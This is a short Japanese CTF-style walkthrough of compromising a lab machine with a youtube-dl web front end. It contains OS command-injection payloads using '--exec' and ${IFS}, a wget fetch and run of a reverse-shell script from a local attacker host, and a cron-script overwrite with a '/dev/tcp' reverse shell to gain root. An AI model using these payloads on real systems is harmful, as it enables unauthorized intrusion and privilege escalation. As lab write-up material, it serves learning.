### 論点
- BurpSuiteでrepeater
- bashの空白`${IFS}`
  - `ls${IFS}-la`やってみる 
- シングルクォートとバッククォートの違い
  - `echo 'echo hello'`
  - `` echo `echo hello` `` 
### 課題
- 送信先のコードを見る。コマンドのオプションだけ使えるので`yt-dl`の部分が隠れているのを確認する
## 攻略
- nmap
  - 22,80
- webサイトを見るが適当に入力するが送信がpostなのでBurpSuiteを起動する
  - 適当に入力してburpsuiteでResponseのデータ部分を見たら、エラーが出てるがよくわからんから、`"WARNIG: Assuming ~`の部分からコピーして検索してみる
  - `github.com/ytdl-org/youtube-dl`のサイトを見るとオプションが使えることがわかる
- osコマンドインジェクションができるかを確認する
  - Requestのところで右クリックして`send to repeater`を送る
  - postのボディ部分のyt_url=のところに`` --exec%3c`ls${IFS}-la` ``を入力するとレスポンスにコマンドの結果が返ってくる
    - `${IFS}`はbashでのスペースのこと
    - ここではバッククォートが使われているが、シングルやダブルクォートの違いはシングルなどは文字列に対して、バッククォートはコマンドを一つの塊にしたもの
- reverse-shellで侵入
  - ここでreverse-shellのファイルを置いて、reverse-shellをする。普段なら、リバースシェルのコードを実行させるが、なぜかできないので、リバースシェルを書いたファイルをuploadして、そのファイルをもう一度実行させる
  - Parrotでvimでfile.shを作る`import socket,subprocess~`を貼り付けて、ターゲット側で受け取る
  - postのボディ部分のyt_url=のところに`` --exec%3c`wget${IFS}http://192.168.56.101:8000/file.sh` ``を入力する
  - parrotで待ち受ける
  - postのボディ部分のyt_url=のところに`` --exec%3c`bash${IFS}file.sh` ``を入力する

- id
  - www-dataのみ 
- suid
  - pkexecくらいしかない
- 探索する
  - 今の場所でlsするとtmpがある。入ると、clean.shがある。これはクローンで定期的に動いている可能性があるのでここに書き込む
  - `echo "bash -i >& /dev/tcp/192.168.56.101/8888 0>&1" > clean.sh`
- 待受する
  - `nc -nlvp 8888`
- rootになる
  - しばらく待つとrootになる  
